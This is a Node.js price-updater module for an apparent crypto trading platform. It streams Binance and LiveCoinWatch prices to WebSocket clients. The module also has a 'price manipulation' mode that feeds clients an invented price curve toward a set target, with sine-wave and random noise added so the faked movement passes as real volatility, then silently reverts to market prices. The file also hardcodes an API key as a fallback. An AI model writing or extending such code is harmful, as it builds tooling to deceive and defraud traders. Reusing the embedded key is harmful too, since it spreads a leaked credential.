const MarketPrice = require('../MarketPrice');
const axios = require('axios');
const WebSocket = require('ws');

let intervalHandle = null;
const wsConnections = new Map();
const realTimePrices = new Map();

// Default configuration
const DEFAULT_SYMBOLS = [
  { symbol: 'BTCUSDT', price: 40000 },
  { symbol: 'ETHUSDT', price: 2500 },
  { symbol: 'LTCUSDT', price: 150 },
];

// LiveCoinWatch configuration (default to provided key if env not set)
const LCW_API_KEY = process.env.LIVECOINWATCH_API_KEY || '1b0809f9-08d7-4326-9446-4e2e34150f9a';
const LCW_SINGLE_URL = 'https://api.livecoinwatch.com/coins/single';

function deriveBaseCode(sym) {
  if (!sym) return sym;
  const s = (sym || '').replace('/', '').toUpperCase();
  if (s.endsWith('USDT')) return s.replace(/USDT$/i, '');
  if (s.endsWith('USD')) return s.replace(/USD$/i, '');
  return s;
}

// Fetch real price from LiveCoinWatch (preferred) or Binance as fallback
async function fetchRealPrice(symbol) {
  if (LCW_API_KEY) {
    try {
      const code = deriveBaseCode(symbol);
      const body = { currency: 'USD', code };
      const resp = await axios.post(LCW_SINGLE_URL, body, {
        headers: { 'x-api-key': LCW_API_KEY, 'Content-Type': 'application/json' },
        timeout: parseInt(process.env.PRICE_FETCH_TIMEOUT_MS || '5000', 10),
      });

      let payload = resp && resp.data ? resp.data : null;
      if (payload && payload.data) payload = payload.data;

      let price = null;
      if (payload) {
        price = payload.rate || payload.price || payload.rateUsd || payload.value || null;
        if (!price && payload.price && typeof payload.price === 'object') {
          price = payload.price.rate || payload.price.value || null;
        }
      }

      return price !== null && price !== undefined ? Number(price) : null;
    } catch (err) {
      console.error(`LCW fetch error for ${symbol}:`, err?.message || err);
      // fall through to Binance fallback
    }
  }

  // Binance fallback
  try {
    const response = await axios.get('https://api.binance.com/api/v3/ticker/price', {
      params: { symbol },
      timeout: parseInt(process.env.PRICE_FETCH_TIMEOUT_MS || '5000', 10),
    });
    return parseFloat(response.data.price);
  } catch (error) {
    console.error(`Error fetching price for ${symbol} from Binance:`, error.message);
    return null;
  }
}

function randomChange(price, volatility) {
  const pct = (Math.random() * 2 - 1) * volatility; // between -volatility..+volatility
  return Math.max(0.00000001, price * (1 + pct));
}

/**
 * Calculates a manipulated price based on an easing curve and simulated volatility.
 * @param {object} config - The manipulation configuration.
 * @param {number} elapsed - Milliseconds since manipulation started.
 * @returns {number} The calculated manipulated price.
 */
function calculateManipulatedPrice(config, elapsed) {
  const { startPrice, endValue, durationMs } = config;
  const progress = Math.min(elapsed / durationMs, 1);

  // Natural ease-in-out quadratic curve for smooth price movement
  const easeProgress = progress < 0.5 ? 2 * progress * progress : 1 - Math.pow(-2 * progress + 2, 2) / 2;

  const basePrice = startPrice + (endValue - startPrice) * easeProgress;

  // Add realistic market volatility using layered sine waves and random noise
  const volatilityPercent = 0.002; // 0.2% fluctuation
  const wave1 = Math.sin(elapsed / 1000) * basePrice * volatilityPercent;
  const wave2 = Math.sin(elapsed / 500 + 1.5) * basePrice * volatilityPercent * 0.5;
  const randomNoise = (Math.random() - 0.5) * basePrice * volatilityPercent * 0.2;

  return basePrice + wave1 + wave2 + randomNoise;
}

async function seedIfEmpty(symbols) {
  for (const s of symbols) {
    const existing = await MarketPrice.findOne({ symbol: s.symbol });
    if (!existing) {
      await new MarketPrice({ symbol: s.symbol, price: s.price }).save();
    }
  }
}

async function tick(options = {}) {
  const { wss } = options;
  const volatility = parseFloat(process.env.PRICE_VOLATILITY || options.volatility || 0.02);
  const symbols = options.symbols || DEFAULT_SYMBOLS.map((s) => s.symbol);

  const prices = await MarketPrice.find({ symbol: { $in: symbols } });
  const now = new Date();
  const updatedPrices = [];

  // update each symbol
  for (const symbol of symbols) {
    let doc = prices.find((p) => p.symbol === symbol);
    if (!doc) {
      // If missing, create with a reasonable default
      const defaultObj = DEFAULT_SYMBOLS.find((d) => d.symbol === symbol) || { price: 100 };
      doc = new MarketPrice({ symbol, price: defaultObj.price });
    }

    let newPrice;

    // Check if there's an active price manipulation
    if (doc.manipulation && doc.manipulation.isActive) {
      const manip = doc.manipulation;
      const startTime = new Date(manip.startTime);
      const endTime = new Date(manip.endTime);

      if (now >= startTime && now < endTime) {
        // During manipulation period - calculate interpolated and volatile price
        const totalDuration = endTime - startTime;
        const elapsed = now - startTime;

        newPrice = calculateManipulatedPrice(
          {
            startPrice: manip.originalPrice,
            endValue: manip.endValue,
            durationMs: totalDuration,
          },
          elapsed
        );
      } else if (now >= endTime) {
        // Manipulation period has just ended. Revert to a real price.
        console.log(`Price manipulation ended for ${symbol}. Reverting to real price.`);
        doc.manipulation.isActive = false;
        // Fetch the actual market price to restore it
        newPrice = (await fetchRealPrice(symbol)) || doc.price;
      } else {
        // Before manipulation starts - normal behavior
        newPrice = (await fetchRealPrice(symbol)) || randomChange(doc.price, volatility);
      }
    } else {
      // No active manipulation - use the latest real-time price from WebSocket
      // Fallback to random change if WebSocket price is not available yet
      const realTimePrice = realTimePrices.get(symbol);
      newPrice = realTimePrice !== undefined ? realTimePrice : randomChange(doc.price, volatility);
    }

    doc.price = Number(newPrice.toFixed(8));
    doc.updatedAt = now;
    await doc.save();
    updatedPrices.push(doc);
  }

  // Broadcast the updated prices to all WebSocket clients
  if (wss && wss.clients.size > 0) {
    const message = JSON.stringify(updatedPrices);
    wss.clients.forEach((client) => {
      // readyState 1 means the connection is open
      if (client.readyState === 1) {
        client.send(message);
      }
    });
  }
}

function connectToBinance(symbol, wss) {
  const wsUrl = `wss://stream.binance.com:9443/ws/${symbol.toLowerCase()}@trade`;
  const ws = new WebSocket(wsUrl);

  ws.on('open', () => {
    console.log(`Connected to Binance WebSocket for ${symbol}`);
  });

  ws.on('message', (data) => {
    const trade = JSON.parse(data);
    const price = parseFloat(trade.p);
    realTimePrices.set(symbol, price);
  });

  ws.on('error', (error) => {
    console.error(`WebSocket error for ${symbol}:`, error);
  });

  ws.on('close', () => {
    console.log(`WebSocket disconnected for ${symbol}. Reconnecting in 3 seconds...`);
    wsConnections.delete(symbol);
    setTimeout(() => connectToBinance(symbol, wss), 3000);
  });

  wsConnections.set(symbol, ws);
}

function start(options = {}) {
  const { wss } = options;
  const intervalMs = parseInt(process.env.PRICE_UPDATE_INTERVAL_MS || options.intervalMs || '1000', 10);
  const symbols = options.symbols || DEFAULT_SYMBOLS.map((s) => s.symbol);
  const volatility = options.volatility || parseFloat(process.env.PRICE_VOLATILITY || '0.02');

  // seed default symbols if missing
  seedIfEmpty(DEFAULT_SYMBOLS).catch((err) => console.error('Price seeding error', err));

  // Connect to Binance for each symbol
  symbols.forEach((symbol) => {
    if (!wsConnections.has(symbol)) {
      connectToBinance(symbol, wss);
    }
  });

  if (intervalHandle) clearInterval(intervalHandle); // Clear existing interval if any

  intervalHandle = setInterval(() => {
    tick({ symbols, volatility, wss }).catch((err) => console.error('Price tick error', err));
  }, intervalMs);

  console.log(`Price updater started: interval=${intervalMs}ms`);
}

function stop() {
  if (intervalHandle) clearInterval(intervalHandle);
  wsConnections.forEach((ws) => ws.close());
  wsConnections.clear();
  intervalHandle = null;
  console.log('Price updater stopped');
}

module.exports = { start, stop, tick };
